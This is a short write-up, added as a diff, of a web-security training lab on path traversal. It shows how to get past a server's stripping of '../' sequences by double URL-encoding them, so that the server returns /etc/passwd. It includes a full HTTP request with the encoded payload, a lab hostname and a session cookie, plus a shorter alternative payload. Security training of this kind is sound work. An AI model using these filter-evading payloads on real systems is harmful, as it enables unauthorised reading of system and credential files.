@@ -1,0 +1,31 @@
+Lab #4: File path traversal, traversal sequences stripped with superfluous URL-decode
+
+Target: Get access to the content of /etc/passwd
+
+Analysis:
+
+The image files are loaded with Get request, but your traversal string is stripped at the web server:
+
+GET /image?filename=72.jpg
+
+solution:
+We should encode the request url so that the web server does not recognize the attack pattern. We have to encode the whole string twice, while the server decodes it once and check it against the attack patterns.
+
+send the request to the repeater as follows:
+GET /image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 HTTP/2
+Host: 0a740064047535ac804ab26a00d00045.web-security-academy.net
+Cookie: session=dDHQrzKbHrVXKoQje5TOGoUbkdHMu9hm
+Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
+....
+
+or change the file name with encoded / character:
+
+GET /image?filename=..%252f..%252f..%252fetc/passwd
+
+to encode select the text in repeater, right click on selection choose convert selection/URL/url encode all characters
+
+
